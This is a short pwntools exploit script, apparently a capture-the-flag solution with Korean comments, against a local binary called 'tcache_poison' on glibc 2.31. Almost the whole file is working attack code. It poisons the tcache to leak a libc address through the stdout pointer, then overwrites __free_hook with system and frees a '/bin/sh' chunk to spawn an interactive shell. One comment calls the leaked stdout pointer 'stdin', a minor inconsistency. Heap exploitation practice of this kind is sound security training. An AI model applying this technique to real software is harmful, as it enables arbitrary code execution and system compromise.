from pwn import *

p = process("./tcache_poison")

libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
e = ELF("./tcache_poison")


def alloc(size, data):
    p.sendlineafter("Edit\n", "1")
    p.sendlineafter(":", str(size))
    p.sendafter(":", data)
def free():
    p.sendlineafter("Edit\n", "2")
def print_chunk():
    p.sendlineafter("Edit\n", "3")
def edit(data):
    p.sendlineafter("Edit\n", "4")
    p.sendafter(":", data)


# 1. libc_base 구하기
addr_stdout = e.symbols["stdout"]

alloc(64, "aaaa")
free()

edit("AAAAAAAA"+"\x00")
free()

alloc(64, p64(addr_stdout))
# 인제 "aaaa" -> stdin 요상태다. (aaaa의 fd에 stdin 들어간다.)
# 여기서 할당 64byte짜리 하면 "aaaa"청크 꺼낸다.
# 한번더하면 stdin 청크 꺼낸다.
alloc(64, "bbbb")
alloc(64, "\xa0")

# print해서 __IO_2_1_stdin_주소 읽을 수 있음
print_chunk()
p.recvuntil(b"Content: ")
stdin = u64(p.recv(6).ljust(8, b"\x00"))


libc_base = stdin - libc.symbols["_IO_2_1_stdout_"]
print(hex(libc_base))
free_hook = libc_base + libc.symbols["__free_hook"]
system = libc_base + libc.symbols["system"]


# 2. freehook overwrite
alloc(48, "a")
free()
edit("aaaaaaaa"+"\x00")
free()

alloc(48, p64(free_hook))
alloc(48, "a")
alloc(48, p64(system))

alloc(8, "/bin/sh")
free()


p.interactive()